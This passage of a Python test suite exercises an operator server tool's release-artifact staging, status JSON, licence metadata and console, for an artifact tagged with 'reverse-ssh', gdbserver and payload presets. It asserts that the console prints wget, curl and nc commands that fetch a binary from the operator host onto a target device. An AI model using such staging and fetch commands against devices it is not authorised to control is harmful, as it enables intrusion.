        release_artifact_actions_by_release_path = release_doc.get("release_artifact_workflow_actions_by_release_path") or {}
        release_artifact_actions_by_scope = release_doc.get("release_artifact_workflow_actions_by_recommendation_scope") or {}
        release_license = rel.get("release_license") or {}
        release_license_records = rel.get("release_license_records") or []
        release_licenses_by_project = rel.get("release_license_records_by_project_license") or {}
        release_licenses_by_gplv2 = rel.get("release_license_records_by_combined_gplv2_compatible") or {}
        release_licenses_by_component = rel.get("release_license_records_by_component") or {}
        release_licenses_by_component_license = rel.get("release_license_records_by_component_license") or {}
        release_licenses_by_notice = rel.get("release_license_records_by_notice_file") or {}
        release_licenses_by_evidence = rel.get("release_license_records_by_evidence_source") or {}
        release_licenses_by_evidence_license = rel.get("release_license_records_by_evidence_source_license") or {}
        release_artifact_size = len("artifact\n")
        release_layout_artifact = "by-tuple/native/host/host/host/bin/grit-test"
        doom_wad_sha = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
        if (release_artifact_map.get("bin/grit-test", {}).get("name") != "grit-test" or
                release_artifacts_by_name.get("grit-test", [{}])[0].get("release_path") != "bin/grit-test" or
                release_artifacts_by_sha.get("abc123", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_preset.get("default", [{}])[0].get("sha256") != "abc123" or
                release_artifacts_by_compat.get("exact", [{}])[0].get("payload_preset") != "default" or
                release_artifacts_by_source.get("release-index", [{}])[0].get("release_path") != "bin/grit-test" or
                release_artifacts_by_tuple_path.get("by-tuple/native/host/host/host", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_tool.get("sh", [{}])[0].get("payload_preset") != "default" or
                release_artifacts_by_device_alias.get("lab-router", [{}])[0].get("device_aliases") != ["lab-router"] or
                release_artifacts_by_feature.get("reverse-ssh", [{}])[0].get("release_path") != "bin/grit-test" or
                release_artifacts_by_tool_preset.get("sh:default", [{}])[0].get("release_path") != "bin/grit-test" or
                release_artifacts_by_device_preset.get("lab-router:default", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_feature_preset.get("reverse-ssh:default", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_tuple_preset.get("by-tuple/native/host/host/host:default", [{}])[0].get("sha256") != "abc123" or
                release_artifacts_by_provider_tool.get("gdbserver", [{}])[0].get("payload_preset") != "default" or
                release_artifacts_by_provider_status.get("gdbserver:found", [{}])[0].get("name") != "grit-test" or
                release_artifact_map.get("bin/grit-test", {}).get("doom_wads", [{}])[0].get("filename") != "doom.wad" or
                release_artifacts_by_doom_wad_filename.get("doom.wad", [{}])[0].get("release_path") != "bin/grit-test" or
                release_artifacts_by_doom_wad_sha256.get(doom_wad_sha, [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_command_queue_enabled.get("false", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_command_queue_execution_supported.get("false", [{}])[0].get("name") != "grit-test" or
                release_artifacts_by_command_queue_operator_supplied.get("false", [{}])[0].get("name") != "grit-test" or
                rel.get("artifact_stats", {}).get("total_size") != release_artifact_size or
                rel.get("artifact_stats", {}).get("by_compatibility", {}).get("exact") != 1 or
                rel.get("artifact_stats", {}).get("by_payload_preset", {}).get("default") != 1 or
                rel.get("artifact_stats", {}).get("by_source", {}).get("release-index") != 1 or
                rel.get("artifact_stats", {}).get("by_tool", {}).get("sh") != 1 or
                rel.get("artifact_stats", {}).get("by_device_alias", {}).get("lab-router") != 1 or
                rel.get("artifact_stats", {}).get("by_feature", {}).get("reverse-ssh") != 1 or
                rel.get("artifact_stats", {}).get("by_provider_tool", {}).get("gdbserver") != 1 or
                rel.get("artifact_stats", {}).get("by_provider_status", {}).get("gdbserver:found") != 1 or
                rel.get("artifact_stats", {}).get("by_doom_wad_filename", {}).get("doom.wad") != 1 or
                rel.get("artifact_stats", {}).get("by_doom_wad_sha256", {}).get(doom_wad_sha) != 1 or
                rel.get("artifact_stats", {}).get("by_command_queue_enabled", {}).get("false") != 1 or
                rel.get("artifact_stats", {}).get("by_command_queue_execution_supported", {}).get("false") != 1 or
                rel.get("artifact_stats", {}).get("by_command_queue_operator_supplied_command_execution", {}).get("false") != 1 or
                rel.get("artifact_stats", {}).get("doom_wad_count") != 1 or
                release_device_map.get("lab-router", {}).get("tuple_path") != "by-tuple/native/host/host/host" or
                release_devices_by_tuple_path.get("by-tuple/native/host/host/host", [{}])[0].get("name") != "lab-router" or
                release_devices_by_artifact.get(release_layout_artifact, [{}])[0].get("tuple_path") != "by-tuple/native/host/host/host" or
                release_tuple_map.get("by-tuple/native/host/host/host", {}).get("artifact_count") != 1 or
                release_tuples_by_artifact.get(release_layout_artifact, [{}])[0].get("path") != "by-tuple/native/host/host/host" or
                release_recommendations.get("by_device", {}).get("lab-router", {}).get("name") != "grit-test" or
                release_recommendations.get("by_tuple_path", {}).get("by-tuple/native/host/host/host", {}).get("sha256") != "abc123" or
                release_recommendations.get("by_tool", {}).get("sh", {}).get("payload_preset") != "default" or
                release_recommendations.get("by_payload_preset", {}).get("default", {}).get("name") != "grit-test" or
                release_recommendations.get("by_feature", {}).get("reverse-ssh", {}).get("name") != "grit-test" or
                release_recommendations.get("by_device_payload_preset", {}).get("lab-router:default", {}).get("name") != "grit-test" or
                not release_recommendation_records or
                release_recommendations_by_scope.get("by_device", [{}])[0].get("key") != "lab-router" or
                release_recommendations_by_artifact.get("bin/grit-test", [{}])[0].get("artifact_name") != "grit-test" or
                release_recommendations_by_payload.get("default", [{}])[0].get("artifact_name") != "grit-test" or
                release_recommendations_by_compat.get("exact", [{}])[0].get("payload_preset") != "default" or
                len(release_artifact_actions) != 2 + len(rel.get("artifacts") or []) + len(release_recommendation_records) or
                release_artifact_actions_by_selector.get("artifact", [{}])[0].get("action_id") != "stage-artifact" or
                release_artifact_actions_by_selector.get("recommendation", [{}])[0].get("action_id") != "stage-recommendation" or
                release_artifact_actions_by_action.get("self-test-release", [{}])[0].get("release_name") != "operator-smoke" or
                release_artifact_actions_by_release_path.get("bin/grit-test", [{}])[0].get("headless_command", "").find("--stage-release-artifact") < 0 or
                release_artifact_actions_by_release_path.get("bin/grit-test", [{}])[0].get("run_command", "").find("--run-release-artifact-workflow-action") < 0 or
                release_artifact_actions_by_scope.get("by_device", [{}])[0].get("selector") != "by_device:lab-router" or
                release_license.get("project_license") != "GPL-2.0-or-later" or
                release_license.get("combined_gplv2_compatible") is not True or
                release_license.get("missing_notice_count") != 0 or
                len(release_license_records) != 1 or
                release_licenses_by_project.get("GPL-2.0-or-later", [{}])[0].get("valid") is not True or
                release_licenses_by_gplv2.get("True", [{}])[0].get("project_license") != "GPL-2.0-or-later" or
                release_licenses_by_component.get("BusyBox", [{}])[0].get("combined_gplv2_compatible") is not True or
                release_licenses_by_component_license.get("BusyBox:GPL-2.0", [{}])[0].get("project_license") != "GPL-2.0-or-later" or
                release_license.get("license_evidence_source_count") != 2 or
                release_license.get("license_evidence_verified_at") != "2026-05-29" or
                release_licenses_by_evidence.get("BusyBox", [{}])[0].get("license_evidence_source_urls", {}).get("BusyBox") != "https://busybox.net/license.html" or
                release_licenses_by_evidence_license.get("Buildroot:GPL-2.0-or-later with package exceptions", [{}])[0].get("license_evidence_source_licenses", {}).get("Buildroot") != "GPL-2.0-or-later with package exceptions" or
                release_licenses_by_notice.get("LICENSE.grit", [{}])[0].get("notice_count") != 11):
            print("json status missing release browser lookup maps", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_state = release_doc.get("release_state") or {}
        if (release_state.get("release_dir") != str(release_dir) or
                release_state.get("release_json") != str(release_dir / "release.json") or
                release_state.get("release_index") != str(release_dir / "release-index.json") or
                release_state.get("detection_source") != "auto" or
                release_state.get("detection_reason") != "release.json,release-index.json,bin+scripts" or
                release_state.get("explicit_release_dir") is not False or
                release_state.get("release_marker_count") != 3 or
                release_state.get("present") is not True or
                release_state.get("valid") is not True or
                release_state.get("release_json_valid") is not True or
                release_state.get("release_index_valid") is not True or
                release_state.get("bin_dir_exists") is not True or
                release_state.get("scripts_dir_exists") is not True or
                release_state.get("artifact_count") != 1 or
                release_state.get("device_count") != 1 or
                release_state.get("tuple_count") != 1 or
                release_state.get("release_name") != "operator-smoke" or
                release_state.get("release_license_valid") is not True or
                release_state.get("project_license") != "GPL-2.0-or-later" or
                release_state.get("combined_gplv2_compatible") is not True or
                release_state.get("license_notice_count") != 11 or
                release_state.get("license_missing_notice_count") != 0):
            print("json status missing explicit release state metadata", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_state_records = release_doc.get("release_state_records") or []
        release_state_by_source = release_doc.get("release_state_records_by_detection_source") or {}
        release_state_by_reason = release_doc.get("release_state_records_by_detection_reason") or {}
        release_state_by_marker_count = release_doc.get("release_state_records_by_marker_count") or {}
        release_state_api = ((release_doc.get("api_collections") or {}).get("release_state_records") or {})
        if (len(release_state_records) != 1 or
                release_state_records[0].get("release_dir") != str(release_dir) or
                release_state_by_source.get("auto", [{}])[0].get("release_dir") != str(release_dir) or
                release_state_by_reason.get("release.json,release-index.json,bin+scripts", [{}])[0].get("valid") is not True or
                release_state_by_marker_count.get("3", [{}])[0].get("present") is not True or
                release_state_api.get("count") != 1 or
                release_state_api.get("primary_key") != "release_dir" or
                "release_state_records_by_detection_reason" not in (release_state_api.get("indexes") or []) or
                (release_doc.get("api_resources_by_name") or {}).get("release_state_records", {}).get("summary_key") != "release_state_record_count"):
            print("json status missing release state API records", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_browser_by_kind = release_doc.get("browser_paths_by_kind") or {}
        release_browser_by_path = release_doc.get("browser_paths_by_path") or {}
        release_browser_by_release_path = release_doc.get("browser_paths_by_release_path") or {}
        release_browser_by_kind_source = release_doc.get("browser_paths_by_kind_source_id") or {}
        if (release_doc.get("browser_path_summary", {}).get("by_kind", {}).get("release-artifact") != 1 or
                release_doc.get("browser_path_summary", {}).get("by_release_path", {}).get("bin/grit-test", 0) < 1 or
                release_doc.get("browser_path_summary", {}).get("by_kind", {}).get("release-recommendation-artifact", 0) < 1 or
                release_doc.get("browser_path_summary", {}).get("exists_by_kind", {}).get("release-artifact") != 1 or
                release_doc.get("browser_path_summary", {}).get("exists_by_kind", {}).get("release-recommendation-artifact", 0) < 1 or
                release_doc.get("browser_path_summary", {}).get("kind_mismatch_count") != 0 or
                release_doc.get("summary", {}).get("browser_path_exists_kind_counts", {}).get("release-artifact") != 1 or
                release_doc.get("summary", {}).get("browser_path_release_path_counts", {}).get("bin/grit-test", 0) < 1 or
                release_doc.get("summary", {}).get("browser_path_exists_kind_counts", {}).get("release-recommendation-artifact", 0) < 1 or
                release_doc.get("summary", {}).get("browser_path_kind_mismatch_count") != 0 or
                release_browser_by_kind.get("release-json", [{}])[0].get("path") != str(release_dir / "release.json") or
                release_browser_by_kind.get("release-artifact", [{}])[0].get("release_path") != "bin/grit-test" or
                release_browser_by_kind.get("release-artifact", [{}])[0].get("source_id") != "bin/grit-test" or
                release_browser_by_kind.get("release-recommendation-artifact", [{}])[0].get("source_id") != "by_device:lab-router" or
                release_browser_by_release_path.get("bin/grit-test", [{}])[0].get("path") != str(release_dir / "bin" / "grit-test") or
                release_browser_by_kind.get("release-artifact", [{}])[0].get("expected_kind_matches") is not True or
                release_browser_by_path.get(str(release_dir / "bin" / "grit-test"), [{}])[0].get("kind") != "release-artifact" or
                release_browser_by_kind_source.get("release-artifact:bin/grit-test", [{}])[0].get("path") != str(release_dir / "bin" / "grit-test") or
                release_browser_by_kind_source.get("release-recommendation-artifact:by_device:lab-router", [{}])[0].get("path") != str(release_dir / "bin" / "grit-test")):
            print("json status missing release browser path records", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_summary = release_doc.get("summary") or {}
        if (release_summary.get("release_present") is not True or
                release_summary.get("release_valid") is not True or
                release_summary.get("release_json_valid") is not True or
                release_summary.get("release_index_valid") is not True or
                release_summary.get("release_detection_source") != "auto" or
                release_summary.get("release_detection_reason") != "release.json,release-index.json,bin+scripts" or
                release_summary.get("release_explicit_release_dir") is not False or
                release_summary.get("release_marker_count") != 3 or
                release_summary.get("release_artifact_count", 0) < 1 or
                release_summary.get("release_artifact_total_size") != release_artifact_size or
                release_summary.get("release_device_count") != 1 or
                release_summary.get("release_tuple_count") != 1 or
                release_summary.get("release_device_artifact_reference_count") != 1 or
                release_summary.get("release_tuple_artifact_reference_count") != 1 or
                release_summary.get("release_device_tuple_path_counts", {}).get("by-tuple/native/host/host/host") != 1 or
                release_summary.get("release_device_artifact_counts", {}).get(release_layout_artifact) != 1 or
                release_summary.get("release_tuple_artifact_counts", {}).get(release_layout_artifact) != 1 or
                release_summary.get("release_artifact_compatibility_counts", {}).get("exact") != 1 or
                release_summary.get("release_artifact_payload_preset_counts", {}).get("default") != 1 or
                release_summary.get("release_artifact_source_counts", {}).get("release-index") != 1 or
                release_summary.get("release_artifact_tuple_path_counts", {}).get("by-tuple/native/host/host/host") != 1 or
                release_summary.get("release_artifact_tool_counts", {}).get("sh") != 1 or
                release_summary.get("release_artifact_device_alias_counts", {}).get("lab-router") != 1 or
                release_summary.get("release_artifact_feature_counts", {}).get("reverse-ssh") != 1 or
                release_summary.get("release_artifact_tool_payload_preset_combo_count") != 1 or
                release_summary.get("release_artifact_device_payload_preset_combo_count") != 1 or
                release_summary.get("release_artifact_feature_payload_preset_combo_count") != 3 or
                release_summary.get("release_artifact_tuple_payload_preset_combo_count") != 1 or
                release_summary.get("release_artifact_provider_tool_counts", {}).get("gdbserver") != 1 or
                release_summary.get("release_artifact_provider_status_counts", {}).get("gdbserver:found") != 1 or
                release_summary.get("release_artifact_doom_wad_filename_counts", {}).get("doom.wad") != 1 or
                release_summary.get("release_artifact_doom_wad_sha256_counts", {}).get(doom_wad_sha) != 1 or
                release_summary.get("release_artifact_command_queue_enabled_counts", {}).get("false") != 1 or
                release_summary.get("release_artifact_command_queue_execution_supported_counts", {}).get("false") != 1 or
                release_summary.get("release_artifact_command_queue_operator_supplied_command_execution_counts", {}).get("false") != 1 or
                release_summary.get("release_artifact_doom_wad_count") != 1 or
                release_summary.get("release_license_count") != 1 or
                release_summary.get("release_license_valid_count") != 1 or
                release_summary.get("release_license_notice_count") != 11 or
                release_summary.get("release_license_missing_notice_count") != 0 or
                release_summary.get("release_license_evidence_source_count") != 2 or
                release_summary.get("release_license_evidence_verified_at") != "2026-05-29" or
                release_summary.get("release_project_license_counts", {}).get("GPL-2.0-or-later") != 1 or
                release_summary.get("release_combined_gplv2_compatible_counts", {}).get("True") != 1 or
                release_summary.get("release_corresponding_source_required_counts", {}).get("True") != 1 or
                release_summary.get("release_corresponding_source_status_counts", {}).get("required_for_distribution") != 1 or
                release_summary.get("release_package_license_audit_counts", {}).get("True") != 1 or
                release_summary.get("release_recommendation_count", 0) < 1 or
                release_summary.get("release_recommendation_scope_counts", {}).get("by_device") != 1 or
                release_summary.get("release_recommendation_scope_counts", {}).get("by_device_payload_preset") != 1 or
                release_summary.get("release_recommendation_payload_preset_counts", {}).get("default", 0) < 1 or
                release_summary.get("release_recommendation_compatibility_counts", {}).get("exact", 0) < 1 or
                release_summary.get("release_artifact_workflow_action_count") != len(release_artifact_actions) or
                release_summary.get("release_artifact_workflow_action_writes_staged_files_count") != len(release_artifact_actions) - 2 or
                release_summary.get("release_artifact_workflow_action_selector_kind_counts", {}).get("artifact") != 1 or
                release_summary.get("release_artifact_workflow_action_selector_kind_counts", {}).get("recommendation", 0) < 1 or
                release_summary.get("release_artifact_workflow_action_action_counts", {}).get("stage-artifact") != 1 or
                release_summary.get("release_artifact_workflow_action_action_counts", {}).get("stage-recommendation", 0) < 1):
            print("json status missing release aggregate counts", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_license = (release_doc.get("release") or {}).get("release_license") or {}
        if (release_license.get("corresponding_source_required") is not True or
                release_license.get("corresponding_source_status") != "required_for_distribution" or
                release_license.get("corresponding_source_release_input_count") != 7 or
                release_license.get("corresponding_source_reconstruction_input_count") != 4 or
                release_license.get("corresponding_source_requires_package_license_audit") is not True or
                "LICENSE.grit" not in (release_license.get("corresponding_source_release_inputs") or []) or
                not any("recorded release commit" in item for item in (release_license.get("corresponding_source_reconstruction_inputs") or [])) or
                release_doc.get("release_license_records_by_corresponding_source_required", {}).get("True", [{}])[0].get("project_license") != "GPL-2.0-or-later" or
                release_doc.get("release_license_records_by_corresponding_source_status", {}).get("required_for_distribution", [{}])[0].get("valid") is not True or
                release_doc.get("release_license_records_by_package_license_audit", {}).get("True", [{}])[0].get("combined_gplv2_compatible") is not True):
            print("json status missing release corresponding-source metadata", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        release_api = release_doc.get("api_collections") or {}
        if ("devices_by_tuple_path" not in (release_api.get("release_devices", {}).get("indexes") or []) or
                "devices_by_artifact" not in (release_api.get("release_devices", {}).get("indexes") or []) or
                "tuples_by_artifact" not in (release_api.get("release_tuples", {}).get("indexes") or []) or
                "release_license_records_by_component_license" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_notice_file" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_corresponding_source_required" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_corresponding_source_status" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_package_license_audit" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_evidence_source" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "release_license_records_by_evidence_source_license" not in (release_api.get("release_licenses", {}).get("indexes") or []) or
                "artifacts_by_command_queue_enabled" not in (release_api.get("release_artifacts", {}).get("indexes") or []) or
                "artifacts_by_command_queue_execution_supported" not in (release_api.get("release_artifacts", {}).get("indexes") or []) or
                "artifacts_by_command_queue_operator_supplied_command_execution" not in (release_api.get("release_artifacts", {}).get("indexes") or []) or
                "artifacts_by_device_alias" not in (release_api.get("release_artifacts", {}).get("indexes") or []) or
                "artifacts_by_device_payload_preset" not in (release_api.get("release_artifacts", {}).get("indexes") or []) or
                "recommendations_by_payload_preset" not in (release_api.get("release_recommendations", {}).get("indexes") or []) or
                "recommendations_by_compatibility" not in (release_api.get("release_recommendations", {}).get("indexes") or []) or
                "release_artifact_workflow_actions_by_selector_kind" not in (release_api.get("release_artifact_workflow_actions", {}).get("indexes") or []) or
                "release_artifact_workflow_actions_by_recommendation_scope" not in (release_api.get("release_artifact_workflow_actions", {}).get("indexes") or []) or
                "release_state_records_by_detection_source" not in (release_api.get("release_state_records", {}).get("indexes") or [])):
            print("json status missing release device/tuple api collection indexes", file=sys.stderr)
            print(release_status.stdout, file=sys.stderr)
            return 1
        non_release_dir = Path(tmp) / "non-release"
        (non_release_dir / "scripts").mkdir(parents=True)
        non_release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--json-status",
            ],
            cwd=non_release_dir,
            text=True,
            capture_output=True,
        )
        non_release_doc = json.loads(non_release_status.stdout)
        non_release_state = non_release_doc.get("release_state") or {}
        if (non_release_state.get("present") is not False or
                non_release_state.get("detection_source") != "auto" or
                non_release_state.get("detection_reason") != "no-release-markers" or
                non_release_state.get("explicit_release_dir") is not False or
                non_release_state.get("release_marker_count") != 0 or
                non_release_doc.get("release") or
                non_release_doc.get("summary", {}).get("release_present") is not False or
                non_release_doc.get("summary", {}).get("release_detection_source") != "auto" or
                non_release_doc.get("summary", {}).get("release_detection_reason") != "no-release-markers" or
                non_release_doc.get("summary", {}).get("release_explicit_release_dir") is not False or
                non_release_doc.get("summary", {}).get("release_marker_count") != 0 or
                non_release_doc.get("summary", {}).get("warning_type_counts", {}).get("invalid_release_state", 0) != 0):
            print("json status treated a normal scripts directory as an invalid release bundle", file=sys.stderr)
            print(non_release_status.stdout, file=sys.stderr)
            return 1
        explicit_non_release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--release-dir", str(non_release_dir),
                "--json-status",
            ],
            cwd=tmp,
            text=True,
            capture_output=True,
        )
        explicit_non_release_doc = json.loads(explicit_non_release_status.stdout)
        explicit_non_release_state = explicit_non_release_doc.get("release_state") or {}
        explicit_non_release_warnings = [
            item for item in explicit_non_release_doc.get("warnings", [])
            if item.get("type") == "invalid_release_state"
        ]
        if (explicit_non_release_state.get("present") is not True or
                explicit_non_release_state.get("valid") is not False or
                explicit_non_release_state.get("detection_source") != "explicit" or
                explicit_non_release_state.get("detection_reason") != "explicit-release-dir" or
                explicit_non_release_state.get("explicit_release_dir") is not True or
                explicit_non_release_state.get("release_marker_count") != 0 or
                not explicit_non_release_warnings):
            print("json status did not honor explicit invalid --release-dir metadata", file=sys.stderr)
            print(explicit_non_release_status.stdout, file=sys.stderr)
            return 1
        invalid_release_dir = Path(tmp) / "invalid-release"
        (invalid_release_dir / "bin").mkdir(parents=True)
        (invalid_release_dir / "scripts").mkdir()
        (invalid_release_dir / "release.json").write_text("{not-json\n", encoding="utf-8")
        invalid_release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--json-status",
            ],
            cwd=invalid_release_dir,
            text=True,
            capture_output=True,
        )
        invalid_release_doc = json.loads(invalid_release_status.stdout)
        invalid_release_state = invalid_release_doc.get("release_state") or {}
        invalid_release_warnings = [
            item for item in invalid_release_doc.get("warnings", [])
            if item.get("type") == "invalid_release_state"
        ]
        if (invalid_release_state.get("present") is not True or
                invalid_release_state.get("valid") is not False or
                invalid_release_state.get("detection_source") != "auto" or
                invalid_release_state.get("detection_reason") != "release.json,bin+scripts" or
                invalid_release_state.get("explicit_release_dir") is not False or
                invalid_release_state.get("release_marker_count") != 2 or
                invalid_release_state.get("release_json_valid") is not False or
                not invalid_release_state.get("errors") or
                invalid_release_doc.get("release") or
                invalid_release_doc.get("summary", {}).get("release_valid") is not False or
                invalid_release_doc.get("summary", {}).get("warning_type_counts", {}).get("invalid_release_state") != 1 or
                invalid_release_doc.get("summary", {}).get("warning_path_counts", {}).get(str(invalid_release_dir)) != 1 or
                invalid_release_doc.get("summary", {}).get("warning_path_counts", {}).get(str(invalid_release_dir / "release.json")) != 1 or
                invalid_release_doc.get("summary", {}).get("warning_path_counts", {}).get(str(invalid_release_dir / "release-index.json")) != 1 or
                invalid_release_doc.get("summary", {}).get("warning_type_path_counts", {}).get(f"invalid_release_state:{invalid_release_dir}") != 1 or
                not invalid_release_warnings or
                invalid_release_warnings[-1].get("path") != str(invalid_release_dir) or
                not invalid_release_warnings[-1].get("errors") or
                invalid_release_doc.get("warnings_by_type", {}).get("invalid_release_state", [{}])[-1].get("path") != str(invalid_release_dir) or
                invalid_release_doc.get("warnings_by_path", {}).get(str(invalid_release_dir), [{}])[-1].get("type") != "invalid_release_state" or
                invalid_release_doc.get("warnings_by_path", {}).get(str(invalid_release_dir / "release.json"), [{}])[-1].get("type") != "invalid_release_state" or
                invalid_release_doc.get("warnings_by_path", {}).get(str(invalid_release_dir / "release-index.json"), [{}])[-1].get("type") != "invalid_release_state" or
                invalid_release_doc.get("warnings_by_type_path", {}).get(f"invalid_release_state:{invalid_release_dir}", [{}])[-1].get("path") != str(invalid_release_dir)):
            print("json status did not expose invalid release bundle state", file=sys.stderr)
            print(invalid_release_status.stdout, file=sys.stderr)
            return 1
        invalid_release_text = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--status",
            ],
            cwd=invalid_release_dir,
            text=True,
            capture_output=True,
        )
        if ("release bundle state is invalid:" not in invalid_release_text.stdout or
                "release.json:" not in invalid_release_text.stdout):
            print("text status did not expose invalid release bundle warning", file=sys.stderr)
            print(invalid_release_text.stdout, file=sys.stderr)
            return 1
        staged_release = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--stage-release-artifact", "grit-test",
                "--list-staged",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if staged_release.returncode != 0 or "grit fetch grit-test" not in staged_release.stdout:
            print("--stage-release-artifact did not stage release artifact", file=sys.stderr)
            print(staged_release.stdout, file=sys.stderr)
            print(staged_release.stderr, file=sys.stderr)
            return 1
        staged_release_recommendation = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--stage-release-artifact", "by_device:lab-router",
                "--list-staged",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if (staged_release_recommendation.returncode != 0 or
                "grit fetch grit-test" not in staged_release_recommendation.stdout):
            print("--stage-release-artifact did not stage release recommendation", file=sys.stderr)
            print(staged_release_recommendation.stdout, file=sys.stderr)
            print(staged_release_recommendation.stderr, file=sys.stderr)
            return 1
        staged_release_workflow = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--run-release-artifact-workflow-action", "by_device:lab-router",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if (staged_release_workflow.returncode != 0 or
                "release artifact workflow action:" not in staged_release_workflow.stdout or
                "staged grit-test" not in staged_release_workflow.stdout):
            print("--run-release-artifact-workflow-action did not stage release recommendation", file=sys.stderr)
            print(staged_release_workflow.stdout, file=sys.stderr)
            print(staged_release_workflow.stderr, file=sys.stderr)
            return 1
        staged_release_tuple_recommendation = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(state_file),
                "--staged-file", str(staged_file),
                "--stage-release-artifact", "by_tuple_path:by-tuple/native/host/host/host",
                "--list-staged",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if (staged_release_tuple_recommendation.returncode != 0 or
                "grit fetch grit-test" not in staged_release_tuple_recommendation.stdout or
                f"http://{advertised_operator_host}:{fetch_port}/fetch?name=grit-test" not in staged_release_tuple_recommendation.stdout or
                f"--host {advertised_operator_host} --port {fetch_port}" not in staged_release_tuple_recommendation.stdout):
            print("--stage-release-artifact did not stage tuple recommendation", file=sys.stderr)
            print(staged_release_tuple_recommendation.stdout, file=sys.stderr)
            print(staged_release_tuple_recommendation.stderr, file=sys.stderr)
            return 1
        line_release_staged_file = Path(tmp) / "operator-session" / "line-release-staged.json"
        line_release_state_file = Path(tmp) / "operator-session" / "line-release-state.json"
        line_master, line_slave = pty.openpty()
        try:
            line_proc = subprocess.Popen(
                [
                    str(server),
                    "--config", str(fetch_cfg),
                    "--state-file", str(line_release_state_file),
                    "--staged-file", str(line_release_staged_file),
                ],
                cwd=release_dir,
                stdin=line_slave,
                stdout=line_slave,
                stderr=subprocess.PIPE,
                text=True,
                env={**os.environ, "TERM": "dumb"},
            )
            os.close(line_slave)
            line_slave = -1
            time.sleep(0.3)
            os.write(
                line_master,
                (
                    "help release\n"
                    "release\n"
                    "release stage by_tuple_path:by-tuple/native/host/host/host\n"
                    "q\n"
                    "q\n"
                ).encode("utf-8"),
            )
            line_stdout_chunks = []
            deadline = time.time() + 5
            while line_proc.poll() is None and time.time() < deadline:
                readable, _, _ = select.select([line_master], [], [], 0.1)
                if readable:
                    try:
                        line_stdout_chunks.append(os.read(line_master, 65536).decode("utf-8", errors="replace"))
                    except OSError:
                        break
            if line_proc.poll() is None:
                line_proc.terminate()
                try:
                    line_proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    line_proc.kill()
                    line_proc.wait(timeout=2)
            _line_stdout = "".join(line_stdout_chunks)
            line_stderr = line_proc.stderr.read()
        finally:
            if line_slave != -1:
                os.close(line_slave)
            try:
                os.close(line_master)
            except OSError:
                pass
        if (line_proc.returncode != 0 or
                "Traceback" in (line_stderr or "") or
                "Help: release" not in _line_stdout or
                "stage-release [--start] SELECTOR" not in _line_stdout or
                "release stage SELECTOR  |  release ? for help" not in _line_stdout or
                "Preset selectors:" not in _line_stdout or
                "by_tuple_payload_preset:by-tuple/native/host/host/host:default" not in _line_stdout or
                "selector=by_tuple_path:by-tuple/native/host/host/host" not in _line_stdout or
                "Release artifact staged:" not in _line_stdout or
                "target fetch: grit fetch grit-test" not in _line_stdout or
                "Target fetch options:" not in _line_stdout or
                f"http://{advertised_operator_host}:{fetch_port}/fetch?name=grit-test" not in _line_stdout or
                f"--host {advertised_operator_host} --port {fetch_port}" not in _line_stdout or
                "wget -O ./grit-test " not in _line_stdout or
                "curl -fL -o ./grit-test " not in _line_stdout or
                "nc:    printf 'GET /fetch?name=grit-test HTTP/1.0" not in _line_stdout or
                "/fetch?name=grit-test" not in _line_stdout or
                "headless_command:" in _line_stdout):
            print("line-oriented console direct release staging exposed noisy headless command or missed expected summary", file=sys.stderr)
            print(_line_stdout, file=sys.stderr)
            print(line_stderr or "", file=sys.stderr)
            return 1
        line_staged = json.loads(line_release_staged_file.read_text(encoding="utf-8"))
        if ((line_staged.get("staged") or {}).get("grit-test", {}).get("tuple_path") !=
                "by-tuple/native/host/host/host"):
            print("line-oriented console staged release metadata incorrectly", file=sys.stderr)
            print(json.dumps(line_staged, indent=2), file=sys.stderr)
            return 1
        line_release_status = subprocess.run(
            [
                str(server),
                "--config", str(fetch_cfg),
                "--state-file", str(line_release_state_file),
                "--staged-file", str(line_release_staged_file),
                "--json-status",
            ],
            cwd=release_dir,
            text=True,
            capture_output=True,
        )
        if line_release_status.returncode != 0:
            print("line-oriented console release status failed", file=sys.stderr)
            print(line_release_status.stdout, file=sys.stderr)
            print(line_release_status.stderr, file=sys.stderr)
            return 1
        line_release_doc = json.loads(line_release_status.stdout)
